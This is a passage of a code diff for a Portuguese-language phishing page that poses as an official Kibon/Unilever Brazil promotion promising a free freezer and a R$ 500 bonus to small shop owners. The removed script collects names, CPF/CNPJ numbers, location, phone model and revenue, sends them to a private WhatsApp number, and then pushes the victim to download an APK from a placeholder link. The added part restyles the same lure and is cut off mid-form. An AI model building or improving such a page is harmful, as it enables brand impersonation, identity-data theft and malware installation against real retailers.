@@ -2,62 +2,29 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KIBON - Oficial</title>
+    <title>KIBON - Freezer + Bônus R$ 500</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Arial Black', sans-serif; }
         body { background: #E2001A; padding: 10px; text-align: center; }
-        .header h1 { font-size: 70px; font-weight: 900; color: #fff; letter-spacing: -4px; margin: 10px 0; }
-        .tag { background: #FFD700; color: #E2001A; padding: 5px 15px; border-radius: 50px; font-weight: 900; display: inline-block; transform: rotate(-2deg); }
+        .header h1 { font-size: 70px; font-weight: 900; color: #fff; letter-spacing: -5px; margin: 10px 0; text-shadow: 3px 3px 0 #000; }
+        .tag { background: #FFD700; color: #E2001A; padding: 6px 15px; border-radius: 50px; font-weight: 900; display: inline-block; transform: rotate(-2deg); box-shadow: 2px 2px 0 #000; }
         .box { background: #000; border: 2px solid #FFD700; border-radius: 20px; margin: 15px 0; padding: 15px; color: #fff; }
-        .price { font-size: 45px; font-weight: 900; display: block; }
+        .price { font-size: 45px; font-weight: 900; display: block; color: #fff; }
         .card { background: #fff; border-radius: 25px; padding: 20px; text-align: left; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        label { display: block; font-size: 10px; font-weight: bold; color: #777; margin-bottom: 3px; text-transform: uppercase; }
-        input, select { width: 100%; padding: 11px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; margin-bottom: 12px; outline: none; font-weight: bold; }
-        input:focus { border-color: #E2001A; }
-        .error { color: #ff4d4d; font-size: 10px; font-weight: bold; display: none; margin-bottom: 10px; }
-        .btn { width: 100%; padding: 18px; background: #E2001A; color: #fff; border: none; border-radius: 50px; font-size: 17px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
-        .footer { font-size: 10px; color: #fff; margin-top: 15px; opacity: 0.8; }
+        label { display: block; font-size: 10px; font-weight: bold; color: #777; margin-bottom: 3px; text-transform: uppercase; font-family: sans-serif; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; margin-bottom: 12px; outline: none; font-weight: bold; }
+        .error { color: #ff4d4d; font-size: 10px; font-weight: bold; display: none; margin-bottom: 10px; font-family: sans-serif; }
+        .btn { width: 100%; padding: 20px; background: #E2001A; color: #fff; border: none; border-radius: 50px; font-size: 18px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .footer { font-size: 10px; color: #fff; margin-top: 15px; opacity: 0.8; font-family: sans-serif; }
     </style>
 </head>
 <body>
-    <div class="header"><h1>KIBON</h1><div class="tag">KILOUCURA ATACADO</div></div>
+    <div class="header"><h1>KIBON</h1><div class="tag">PROMOÇÃO KILOUCURA</div></div>
     <div class="box">
-        <span style="color:#FFD700; font-size:11px; font-weight:bold;">PICOLÉ REVENDA</span>
+        <span style="color:#FFD700; font-size:11px; font-weight:bold; letter-spacing:1px;">TABELA REVENDA</span>
         <span class="price">R$ 0,59</span>
-        <p style="font-size:11px; color:#FFD700; font-weight:bold;">🎁 GANHE O FREEZER + R$ 500 DE BÔNUS</p>
+        <p style="font-size:12px; color:#FFD700; font-weight:bold;">🎁 GANHE O FREEZER + R$ 500 DE BÔNUS NO APP</p>
     </div>
     <div class="card">
-        <label>Nome do Responsável</label><input type="text" id="nome">
-        <label>Nome do Comércio</label><input type="text" id="loja">
-        <label>CPF ou CNPJ (Somente números)</label><input type="text" id="doc" maxlength="14">
-        <div id="ed" class="error">⚠️ DOCUMENTO INVÁLIDO!</div>
-        <div style="display:flex; gap:10px;">
-            <div style="flex:1;"><label>UF</label><select id="uf"><option value="">UF</option><option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option><option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option><option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option><option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option><option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option><option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option><option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option><option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option><option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option></select></div>
-            <div style="flex:2;"><label>Cidade</label><input type="text" id="cid"></div>
-        </div>
-        <label>Modelo do Celular</label>
-        <select id="cel">
-            <option value="">Selecione...</option>
-            <option value="iPhone">iPhone (Todos)</option><option value="Samsung">Samsung (Linha S/A/M)</option><option value="Motorola">Motorola (Moto G/Edge)</option><option value="Xiaomi">Xiaomi (Redmi/Poco)</option><option value="Outro">Outro</option>
-        </select>
-        <label>Faturamento Mensal</label>
-        <select id="fat">
-            <option value="">Selecione...</option>
-            <option value="Ate 5k">Até R$ 5.000</option><option value="5k a 15k">R$ 5.000 a R$ 15.000</option><option value="Acima 15k">Acima de R$ 15.000</option>
-        </select>
-        <button class="btn" onclick="go()">RESGATAR BÔNUS E FREEZER</button>
-    </div>
-    <p class="footer">UNILEVER BRASIL © 2026</p>
-    <script>
-        function go() {
-            const doc = document.getElementById('doc').value.replace(/\D/g, '');
-            if (doc.length !== 11 && doc.length !== 14) {
-                document.getElementById('ed').style.display='block'; alert("Documento Inválido!"); return;
-            }
-            const dados = `*REVENDA KIBON*%0A*Loja:* ${document.getElementById('loja').value}%0A*Doc:* ${doc}%0A*Local:* ${document.getElementById('cid').value}-${document.getElementById('uf').value}%0A*Cel:* ${document.getElementById('cel').value}%0A*Fat:* ${document.getElementById('fat').value}`;
-            window.open(`https://api.whatsapp.com/send?phone=5554999422678&text=${dados}`, '_blank');
-            setTimeout(() => { alert("Baixe o App para resgatar o Freezer e o Bônus!"); window.location.href="LINK_DO_APK"; }, 1000);
-        }
-    </script>
-</body>
-</html>
+        <label>Nome do Responsável</label><input type="text" id="nome" placeholder="Titular">
+        <label>Nome do Comércio</label><input type="text" id="loja" placeholder="Nome da Loja
